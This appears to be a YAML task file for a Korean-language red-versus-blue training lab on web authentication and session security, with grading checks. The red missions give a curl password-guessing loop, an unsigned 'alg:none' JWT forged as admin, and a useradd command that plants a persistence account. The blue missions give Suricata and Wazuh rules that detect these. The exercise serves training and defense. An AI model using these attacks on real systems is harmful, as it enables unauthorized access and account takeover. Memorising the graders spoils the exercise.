id: "web-vuln-w04"
category: "web-vuln"
title: "[웹취약점 W4] 인증/세션 — 약한 PW·JWT·세션 고정 vs 인증 보안 점검"
difficulty: "medium"
time_limit: 2700
battle_type: "1v1"
description: |
  웹취약점 점검 4주차 — **인증/세션 관리**. 약한 패스워드·JWT 변조·쿠키 속성·세션 고정·인증 우회를 점검한다.
  공격자는 인증을 공략하고, 점검자(너)는 인증/세션 보안 통제를 구현해 방어한다.

  ▸ 이야기: 공격자가 약한 인증/JWT 변조(태그 `wv04r1`)로 침투하고 위조 JWT(`/tmp/.wv04jwt`)와 계정 `wva04` 를 남긴다.
    점검자는 ① 인증 공격 탐지, ② 세션/JWT Wazuh 룰, ③ 인증/세션 점검 종합·R/B/P 로 대응한다.

  ▸ 모드: solo/duel. 공격자=attacker-ext(2203), Red 채점=대상 흔적(WAF audit 태그/JWT 파일·계정).
  ▸ 마커: 태그 **`wv04r1-<본인id>`**, 위조 JWT **`/tmp/.wv04jwt`**(마커 `wv04`), 계정 **`wva04`**,
    Suricata **sid 9904011**, Wazuh **id 105041**. 종료 시 cleanup.

red_missions:
  - order: 1
    assess_target: opponent
    target_vm: web
    points: 20
    instruction: |
      ## 🎯 RED-1 [인증 공격] — 약한 PW/JWT alg:none

      ### 할 일 (attacker-ext)
      ```bash
      for pw in admin password 123456; do
        curl -s -A "wv04r1-kim" -H "Host: dvwa.6v6.lab" --data "username=admin&password=$pw" "http://<대상_공개IP>/login"
      done
      curl -s -A "wv04r1-kim" -H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1IjoiYWRtaW4ifQ." \
        -H "Host: dvwa.6v6.lab" "http://<대상_공개IP>/api/me"
      ```
      ### 채점 방법 / 합격 기준
      대상 WAF audit 에 태그 `wv04r1` 흔적 시 인정.
    hint: "태그(wv04r1) 약한 PW + JWT alg:none → 대상 modsec audit. 채점: log_contains modsec wv04r1."
    verify:
      type: "log_contains"
      expect: "wv04r1"
      checks:
        - { id: "red-1-1", type: "log_contains", target: "web",
            params: { log: "modsec", pattern: "wv04r1", since_sec: 1800 } }
      semantic:
        intent: "인증 공격(T1110/T1550) — 약한 PW + JWT 변조. 태그(wv04r1) 귀속."
        success_criteria: ["대상 WAF audit 에 wv04r1 태그", "인증 공격 방식 서술"]
        acceptable_methods: ["attacker-ext 에서 태그 단 인증 공격"]
        negative_signs: ["태그 누락 / 대상 미도달"]

  - order: 2
    assess_target: opponent
    target_vm: web
    points: 15
    instruction: |
      ## 🎯 RED-2 [위조 토큰] — JWT 위조 + 계정

      ### 할 일
      ```bash
      printf 'wv04 forged JWT: alg=none, user=admin, no signature verify' > /tmp/.wv04jwt
      sudo useradd -m -s /bin/bash wva04
      ```
      ### 채점 방법 / 합격 기준
      `/tmp/.wv04jwt`(마커 `wv04`) 또는 `wva04` 존재 시 인정.
    hint: "위조 JWT /tmp/.wv04jwt (마커 wv04) + useradd wva04. 채점: file_contains jwt wv04 + file_contains passwd wva04."
    verify:
      type: "file_contains"
      expect: "wv04"
      checks:
        - { id: "red-2-1", type: "file_contains", target: "web",
            params: { path: "/tmp/.wv04jwt", pattern: "wv04" } }
        - { id: "red-2-2", type: "file_contains", target: "web",
            params: { path: "/etc/passwd", pattern: "wva04" } }
      semantic:
        intent: "JWT 위조(T1550.001) + 계정(T1136) — 서명 미검증 토큰 위조."
        success_criteria: ["/tmp/.wv04jwt(마커 wv04) 또는 계정 wva04", "JWT 위조 원리 서술"]
        acceptable_methods: ["위조 JWT 파일 + useradd"]
        negative_signs: ["흔적 미생성"]

blue_missions:
  - order: 1
    assess_target: self
    target_vm: ips
    points: 22
    instruction: |
      ## 🛡️ BLUE-1 [인증 공격 탐지] — Suricata 룰 (sid 9904011)

      ### 할 일
      ```
      alert http any any -> any any (msg:"WEBVULN-W04 JWT alg none tampering"; flow:to_server; content:"eyJhbGciOiJub25lIn0"; nocase; sid:9904011; rev:1;)
      ```
      ```bash
      sudo suricatasc -c reload-rules
      ```
      ### 채점 방법 / 합격 기준
      ips 의 `local.rules` 에 sid 9904011 룰 존재 시 인정.
    hint: "JWT alg:none Suricata 룰(sid 9904011) → reload. 채점: file_contains local.rules 9904011."
    verify:
      type: "file_contains"
      expect: "9904011"
      checks:
        - { id: "blue-1-1", type: "file_contains", target: "ips",
            params: { path: "/etc/suricata/rules/local.rules", pattern: "9904011" } }
      semantic:
        intent: "인증 공격 탐지 — JWT alg:none Suricata 룰. 토큰 위변조 포착."
        success_criteria: ["local.rules 에 sid 9904011", "JWT 변조 탐지 의의"]
        acceptable_methods: ["Suricata 룰 작성 + reload"]
        negative_signs: ["시그니처 부정확 / 문법 오류"]

  - order: 2
    assess_target: self
    target_vm: siem
    points: 20
    instruction: |
      ## 🛡️ BLUE-2 [세션/JWT 보호] — Wazuh 룰 (id 105041)

      ### 할 일
      ```xml
      <group name="edu,webvuln,">
        <rule id="105041" level="12">
          <if_group>edu</if_group>
          <match>wva04</match>
          <description>WEBVULN-W04 - auth bypass / forged token / account</description>
        </rule>
      </group>
      ```
      ```bash
      sudo /var/ossec/bin/wazuh-control restart
      ```
      ### 채점 방법 / 합격 기준
      `local_rules.xml` 에 id 105041 룰 존재 시 인정.
    hint: "세션/JWT 보호 Wazuh 룰(id 105041) → restart. 채점: file_contains local_rules.xml 105041."
    verify:
      type: "file_contains"
      expect: "105041"
      checks:
        - { id: "blue-2-1", type: "file_contains", target: "siem",
            params: { path: "/var/ossec/etc/rules/local_rules.xml", pattern: "105041" } }
      semantic:
        intent: "인증/세션 보호 — 인증 우회/위조 토큰 Wazuh 룰. 서명검증/세션 보안 통제."
        success_criteria: ["local_rules.xml 에 rule id 105041", "인증 우회 탐지 로직"]
        acceptable_methods: ["Wazuh 룰 작성 + restart"]
        negative_signs: ["탐지 로직 부실 / XML 오류"]

  - order: 3
    assess_target: self
    target_vm: siem
    points: 18
    instruction: |
      ## 🛡️ BLUE-3 [인증/세션 점검 종합·R/B/P]

      ### 할 일
      보고서에:
      - 인증/세션 점검(PW 정책/계정 잠금/JWT 서명·alg 고정/쿠키 속성/세션 고정/세션 재발급) + 권고
      - R/B/P 회고 + 위조 JWT(`/tmp/.wv04jwt`)·계정(wva04) 헌팅
      ```bash
      sudo tail -200 /var/ossec/logs/alerts/alerts.json | \
        python3 -c 'import sys,json;[print(json.loads(l).get("rule",{}).get("id")) for l in sys.stdin if l.strip()]' | sort | uniq -c | sort -rn | head
      ```
      ### 채점 방법 / 합격 기준
      본인 SIEM 에 최근 경보 + 제출한 인증/세션 점검·R/B/P 로 인정.
    hint: "인증/세션 점검(PW/계정잠금/JWT 서명·alg/쿠키/세션고정/재발급) + 권고 + R/B/P + JWT/계정 헌팅. 채점: wazuh_alert + 제출."
    verify:
      type: "wazuh_alert"
      expect: "alert"
      checks:
        - { id: "blue-3-1", type: "wazuh_alert", target: "siem", params: { since_sec: 1800 } }
      semantic:
        intent: "인증/세션 점검 종합 — 항목별 점검 + 권고 + R/B/P. 분석형 — 구체 점검/권고 제시 시 점수 상승."
        success_criteria:
          - "최근 경보 수집 확인"
          - "인증/세션 항목별 점검(PW/JWT/쿠키/세션) + 권고"
          - "R/B/P 회고 + JWT/계정 헌팅"
        acceptable_methods: ["점검 표 + 권고 + 회고 + 헌팅"]
        negative_signs: ["권고/회고 누락"]
